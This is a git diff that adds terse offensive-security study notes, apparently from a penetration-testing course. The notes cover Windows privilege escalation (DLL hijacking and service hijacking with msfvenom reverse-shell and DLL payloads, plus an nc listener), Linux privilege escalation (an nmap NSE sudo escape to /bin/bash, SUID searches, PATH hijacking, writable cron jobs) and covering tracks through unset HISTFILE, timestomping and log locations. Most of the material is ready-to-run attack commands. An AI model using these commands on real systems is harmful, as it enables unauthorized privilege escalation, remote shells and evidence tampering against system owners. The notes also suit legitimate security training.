@@ -237,3 +237,218 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 -b "\x00"
   	Encrypted Transport
    		scp <source> <destination>
 		ncat --ssl <ip> <port> < <file>
+		
+## Windows Priv Escalation and Logging
+
+
+### Win Access Control Model
+	Access Tokens
+	Sec Descriptiors
+		DACL
+		SACL
+		ACEs
+	
+	DLL Search Order
+		DLL Search Order -> 
+			HKLM\System\Currentcontrolset\Control\Session Manager\KnownDLLs
+			dir app ran from
+			c code run from, getsystemdir
+			c cdoe in the c+ function getwindows directory
+			current dir
+			
+### Integrioty Mechanisms
+	Untrusted
+	Low
+	Medium
+	High
+	System
+
+### UAC
+	kind of like sudo, will allow to run as admin
+
+### AutoElevate Executables
+	Execution Level:
+		asInvoker
+		highestAvailable
+		
+	find execution levels
+		sigcheck -m <file>
+		
+### Scheduled Tasks & Services
+	evaluate
+		write perms, non-standard locations, unquoted exe paths, vulmerablities in exe, run as system
+
+### Find Vuln Scheduled Tasks
+	schtasks /query /fo LIST /v
+	schtasks /query /fo LIST /v | select-string -Pattern "Task To Run" -CaseSensitive | select-string -pattern "COM handler" -NotMatch
+	sigcheck putty
+	icacls "directory", find what permissions you have for the file in the directory
+	look at proc mon to find the dll, path contains ddl, putty, find where it runs the dlls and how it does
+
+	msfvenom to make payload
+	Lin>
+	msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami -f dll > SSPICLI.ddl
+	
+	Win> 
+	scp student@linip:<filepathtodll> <whereyouwantdlltobe> [whenthe app is run it will search for the directory and the dll will run]
+	
+### Find Vuln Services
+	wmic service list full
+	sc query
+	
+	look in the services gui
+	find shady services
+	filter on description, look at shady ones, look at properties
+		path to exe
+		startup
+	look at the file in the dir, see what you can do with it, find a file where you can do everything in
+		
+	msfvenom -p windows/shell_reverse_tcp LHOST=linops LPORT=<port> -f exe > <filename>
+	net start <service> 	
+	
+	nc lvp <port> to get the shell
+	net localgroup administrators
+	
+### Other Vulnerabilities
+	Patch Kernel Vuln
+	Patch Systems
+	Patch Apps	
+	
+## Linux Privilege Escalation
+
+### Switch User DO
+	To find all the sudoers files, sudo cat /etc/sudoers
+	!!anyone can write to the tmp file!!
+	
+	echo 'os.execute' ("/bin/bash") > /tmp/escape.nse
+	chmod +x /tmp/escape.nse
+	sudo nmap --script=/tmp/escape.nse
+	
+	https://gtfobins.github.io/gtfobins/
+	
+	sudo apt-get changelog apt
+	!/bin/bash -> privilege escalation
+	
+### SUID / SGID
+	If user has suid bit set, if runs with sudo privs, demo2 runs as if it was demo1, you can run it as the user, find them with root privileges
+	
+	find suid, searches for suid only
+		find / -type f -perm /4000 -ls 2>/dev/null
+	
+	find sgid, searches for guid only
+		find / -type f -perm /2000 -ls 2>/dev/null
+		
+	find either
+		find / -type f -perm /6000 -ls 2>/dev/null
+	
+### Insecure Perms
+	CRON
+		is in different spots
+		
+	Word-Writeable Files and Directories
+		find / -type f -perm /2 -o -type d -perm /2 2>/dev/null
+		find / -type f -writable -o -type d -writable 2>/dev/null	
+		
+	Dot '.' in PATH
+		echo $PATH
+		if there is a ., "current dir", or if we can add the "." to the path, we can make own ls
+		
+		echo $PATH
+		PATH=.:$PATH
+		echo $PATH, there is a .
+		
+		vim ls
+		#!/bin/bash
+		whoami
+		chmod +x ls
+		
+		ls -> runs whoami
+
+### Unpatched kern vuleranbilities
+	uname -a
+	cat /proc/version
+	dmesg | grep Linux
+	
+### Adding or Hijacking a User Account
+	Adding vs hijacking a user account, how to access it
+
+### Cron Job 
+	System vs user CRON
+		Persistance can be gotten with cron
+	
+	Kernel Modules Backdoors
+	find /var/spool/cron/crontabs /etc/cron* -writable -ls
+	
+### Covering Tracks
+	Perfrom log cleaning and blending in
+	
+### NIX-ism
+	unset HISTFILE
+	Need to be aware of init system i nuse
+		Systemv, systemd
+	
+### Find init
+	ls -latr /proc/1/exe
+	stat /sbin/init
+	man init
+	init --version
+	ps 1
+	a
+
+### Audtiign System V System
+	ausearch -p 22
+	ausearch -m USER_LOGIN -sv no
+	ausearch -ua edwards -ts yesterday -te now -i
+	
+### Auditing SystemD 
+	journalctl
+	ausearch -m USER_LOGIN -sv no
+	ausearch -ua edwards -ts yesterday -te now -i
+	
+### Logs for Covering Tracks
+
+	Logs typically housed in /var/log & useful logs:
+	
+
+	auth.log/secure -> Logins/authentications
+
+	lastlog -> Each users' last successful login time
+
+	btmp -> Bad login attempts
+
+	sulog -> Usage of SU command
+
+	utmp -> Currently logged in users (W command)
+
+	wtmp -> Permanent record on user on/off
+	
+
+### Working w logs
+	file /var/log/wtmp
+	find /var/log -type f -mmin -10 2> /dev/null	
+	journalctl -f -u ssh
+	journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
+	
+### Timestomp (NIX)
+	touch -c -t 201603051015 1.txt   # Explicit
+	touch -r 3.txt 1.txt    # Reference
+
+### Remote Logging
+	RSYSLOG, need to be thoorough
+	location
+		/etc/rsyslog.d/*
+		/etc/rsyslog.cof
+		grep "IncludeConfig" /etc/rsyslog.conf
+	
+### RSYSLOG Example
+	
+	kern.*                                                # All kernel messages, all severities
+	mail.crit
+	cron.!info,!debug
+	*.*  @192.168.10.254:514                                                    # Old format
+	*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
+	#mail.*
+	
+	
+	
+	
